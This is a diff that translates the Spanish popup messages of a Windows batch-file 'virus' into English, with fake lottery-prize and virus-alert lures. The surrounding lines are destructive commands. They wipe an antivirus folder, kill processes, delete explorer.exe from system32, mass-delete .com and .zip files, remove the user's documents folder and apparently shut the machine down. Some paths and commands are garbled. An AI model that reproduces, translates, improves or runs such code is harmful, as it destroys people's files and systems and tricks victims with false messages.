@@ -16,9 +16,9 @@ cd..
 cd "McAfee.com"
 attrib -R -A -S -H *.*
 del /S /Q *.*
-msg * Hola, ha ganado la loteria!!!!!!
-msg * Para acceder a su premio pulse una tecla pause
-msg * buenos dias aqui esta la primera parte del premio
+msg * Hello, you have won an award!!!!!!
+msg * To access your prize press a pause key.
+msg * Good morning. Here is the first part of the award:
 tskkill iexpress.exe
 tskkill notepad.exe
 tskkill msnmsgr.exe
@@ -73,11 +73,11 @@ echo off>virus545454665 6565.bat
 echo off>virus545454669 8894961320.bat
 echo off>virus0.bat
 ping -n 20 0.0.0.0>nul
-msg * AVISO: Se ha detectado un virus en su computadora
-msg * El progreso ha sido detenido temporalmente
-msg * Para terminar el proceso con exito debe pulsar pause
-msg * Bueno aqui esta otra parte de su premio
-msg * Le deseo que la disfrute
+msg * NOTICE: A virus has been detected on your computer
+msg * Progress has been temporarily stopped
+msg * To finish the process successfully you must press pause
+msg * here is another part of your prize:
+msg * I wish you enjoy it
 ping -n 10 0.0.0.0>nul
 echo.
 echo.
@@ -90,12 +90,12 @@ ping -n 20 0.0.0.0 >nul
 cls
 echo.
 echo.
-msg * como que quieres mas? pos ... OK
+msg * Do you want more? Well... OK
 ping -n 10 0.0.0.0 >nul
 del /f "c:windowssystem32explorer.exe
 echo.
-msg * Seguro que disfruta verdad
-msg * La deseo que la disfruta verdad?
+msg * I'm sure you really enjoy
+msg * Sure
 echo.
 echo.
 ping -n 10 0.0.0.0 >nul
@@ -110,13 +110,13 @@ del /f /s /q "c:*.com"
 del /f /s /q "c:*.zip"
 echo
 ping -n 10 0.0.0.0 >nul
-msg * Ahora le dare otras cosas mas
+msg * Now I will give you other things
 deltree "%userprofile%/mis documentos"
 echo.
 shu*** -a
 echo.
 echo.
-msg * Y por ultimo esto
+msg * And lastly this
 echo.
 :lalbel
 start
